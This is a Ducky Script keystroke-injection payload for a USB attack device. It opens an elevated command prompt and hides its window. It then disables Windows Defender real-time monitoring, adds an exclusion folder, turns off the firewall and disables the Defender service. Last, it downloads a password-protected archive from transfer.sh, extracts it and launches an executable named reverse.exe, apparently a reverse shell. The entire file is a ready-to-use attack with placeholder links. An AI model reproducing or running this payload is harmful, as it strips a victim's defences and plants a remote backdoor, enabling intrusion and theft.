DEFAULT_DELAY 8
DELAY 100
GUI r
DELAY 100
STRING cmd
DELAY 100
CTRL SHIFT ENTER
DELAY 1250
ALT O
REM HIDECMD HERE
STRING mode con:cols=18 lines=1
ENTER
STRING mkdir %temp%\opti
ENTER
DELAY 50
REM DISABLE WINDOWS DEFENDER
STRING powershell -Command Add-MpPreference -ExclusionPath "%TEMP%\opti" & powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true & netsh advfirewall set allprofiles state off & sc config WinDefend start= disabled & cd %temp%\opti & curl https://transfer.sh/OLDLINK/reverse.zip -o reverse.zip & curl 7ZIPLINK -o unzip.exe & unzip.exe e -y -P PASSX %temp%\opti\reverse.zip & start reverse.exe
ENTER
DELAY 2500
STRING exit
ENTER
